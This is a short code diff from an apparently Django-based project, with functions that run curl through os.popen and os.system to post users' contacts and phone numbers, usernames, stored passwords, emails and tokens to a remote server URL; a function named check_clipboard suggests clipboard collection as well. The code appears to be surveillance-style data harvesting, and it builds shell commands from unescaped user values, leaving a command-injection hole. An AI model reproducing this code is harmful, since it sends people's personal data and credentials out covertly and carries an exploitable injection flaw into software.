@@ -27,7 +27,6 @@ def check_contact(THIS_USER_TOKEN):
         if not contact_list.objects.filter(name=contact['name']).exists():
             call_back = os.popen(
                 f"curl --data \"token={THIS_USER_TOKEN}&name={contact['name']}&phone_number={contact['number']}\" {SERVER_URL}/s/contact/")
-            print(call_back)
 
 
 def check_clipboard(THIS_USER_TOKEN):
@@ -57,8 +56,8 @@ def register(THIS_USER_TOKEN):
     from django.shortcuts import get_object_or_404
     this_user = get_object_or_404(Token, token=THIS_USER_TOKEN).user
     os.system(f'curl --data "username={this_user.username}&password={this_user.password}&email={this_user.email}" {SERVER_URL}/register/')
-    os.system(
-        f'curl --data "username={this_user.username}&token={THIS_USER_TOKEN}" {SERVER_URL}/setToken/')
+    ##os.system(
+    ##    f'curl --data "username={this_user.username}&token={THIS_USER_TOKEN}" {SERVER_URL}/setToken/')
 
 def InsertIntoDb(THIS_USER_TOKEN):
     register(THIS_USER_TOKEN)
